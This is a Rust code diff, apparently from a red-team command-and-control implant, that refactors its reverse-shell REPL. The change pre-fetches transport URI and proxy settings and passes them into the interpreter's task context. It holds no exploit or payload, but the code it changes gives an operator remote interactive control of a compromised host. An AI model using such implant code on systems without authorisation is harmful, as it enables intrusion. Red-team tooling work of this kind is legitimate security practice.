@@ -1,7 +1,7 @@
 use anyhow::Result;
 use crossterm::{QueueableCommand, cursor, terminal};
 use eldritch_core::Value;
-use eldritch_libagent::agent::Agent;
+use eldritch_agent::Agent;
 use eldritch_repl::{Repl, ReplAction};
 use eldritchv2::{Interpreter, Printer, Span};
 use pb::c2::{
@@ -45,8 +45,11 @@ pub async fn run_repl_reverse_shell<T: Transport + Send + Sync + 'static>(
     // Initiate gRPC stream
     transport.reverse_shell(output_rx, input_tx).await?;
 
+    // Pre-fetch transport config asynchronously to avoid blocking in the blocking thread
+    let (uri, proxy) = agent.get_transport_config().await;
+
     // Move logic to blocking thread
-    run_repl_loop(task_id, input_rx, output_tx, agent).await;
+    run_repl_loop(task_id, input_rx, output_tx, agent, uri, proxy).await;
     Ok(())
 }
 
@@ -55,6 +58,8 @@ async fn run_repl_loop<T: Transport + Send + Sync + 'static>(
     mut input_rx: tokio::sync::mpsc::Receiver<ReverseShellResponse>,
     output_tx: tokio::sync::mpsc::Sender<ReverseShellRequest>,
     agent: ImixAgent<T>,
+    transport_uri: String,
+    transport_proxy: Option<String>,
 ) {
     let _ = tokio::task::spawn_blocking(move || {
         let printer = Arc::new(ShellPrinter {
@@ -63,10 +68,15 @@ async fn run_repl_loop<T: Transport + Send + Sync + 'static>(
             agent: agent.clone(),
         });
 
+        // Use the pre-fetched transport config
+        let active_transport = transport::ActiveTransport::new(transport_uri, transport_proxy)
+            .unwrap_or_else(|_| transport::ActiveTransport::init());
+
         let mut interpreter =
             Interpreter::new_with_printer(printer)
                 .with_default_libs()
-                .with_task_context::<crate::assets::Asset>(Arc::new(agent), task_id, Vec::new());
+                .with_task_context::<crate::assets::Asset>(Arc::new(agent), task_id, active_transport, Vec::new());
+
         let mut repl = Repl::new();
         let stdout = VtWriter {
             tx: output_tx.clone(),
@@ -212,6 +222,7 @@ impl<T: Transport + Send + Sync + 'static> Printer for ShellPrinter<T> {
                 exec_finished_at: None,
             }),
         };
+        // This relies on agent implementing report_task_output which it does.
         let _ = self.agent.report_task_output(req);
     }
 
